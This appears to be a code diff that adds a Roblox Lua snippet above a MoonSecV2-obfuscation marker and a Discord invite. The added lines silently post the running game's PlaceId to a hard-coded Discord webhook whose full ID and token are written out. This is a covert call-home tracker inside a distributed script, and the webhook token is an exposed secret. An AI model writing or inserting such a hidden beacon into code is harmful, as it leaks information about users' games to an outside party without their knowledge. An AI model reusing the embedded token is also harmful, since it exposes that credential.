@@ -1,3 +1,19 @@
+
+
+local url = "https://discord.com/api/webhooks/911429485830758430/GzIF1VeHS4JuC1s2QOfEMIGrummZ_FcOdTvK9_FAFhlAJIyBdYBS_h7izI-deIudwhg_" ----- webhook link goes here
+local http = game:GetService("HttpService")
+local plr = game.Players.LocalPlayer
+local data = {
+	['embeds'] = {{
+		['title'] = "PlaceId",
+		['description'] = game.PlaceId.. "ID"
+
+	}}
+}
+
+local finaldata = http:JSONEncode(data)
+http:PostAsync(url, finaldata)
+
 _, Protected_by_MoonSecV2, Discord = 'discord.gg/gQEH2uZxUk'
 
 
